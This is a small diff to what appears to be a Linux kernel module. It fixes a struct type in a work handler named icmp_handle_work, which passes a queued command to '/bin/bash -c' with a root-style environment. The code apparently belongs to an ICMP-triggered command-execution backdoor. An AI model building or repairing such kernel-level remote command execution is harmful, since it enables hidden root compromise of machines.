@@ -63,7 +63,7 @@ static void icmp_handle_work(struct work_struct *work) {
 
     pr_info("Entering work handler...\n");
     printk(KERN_DEBUG "Queue length: %d", atomic_read(&work_count));
-    struct arp_work *work_item = container_of(work, struct work_item, work);
+    struct work_item *work_item = container_of(work, struct work_item, work);
 
     char *argv[] = { "/bin/bash", "-c", work_item->command, NULL };
     char *envp[] = { "HOME=/", "TERM=xterm", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
